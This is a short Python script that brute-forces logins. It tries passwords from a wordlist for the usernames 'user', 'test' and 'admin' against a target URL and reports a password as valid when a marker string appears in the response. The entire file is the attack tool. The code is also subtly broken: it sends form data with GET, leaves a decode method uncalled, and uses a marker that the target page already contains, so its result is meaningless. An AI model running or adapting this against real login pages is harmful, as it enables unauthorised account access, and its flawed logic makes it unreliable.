import requests
import sys

target = "https://example.com/"
usernames = ["user", "test", "admin"]
passwords = "dummy-wordlist.txt"
needle = "Example Domain"

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\n".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.get(target, data={"username": username, "password": password})
			print(r)
			if needle.encode() in r.content:
				sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'".format(password.decode, username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\tNo password for '{}'\n".format(username))
        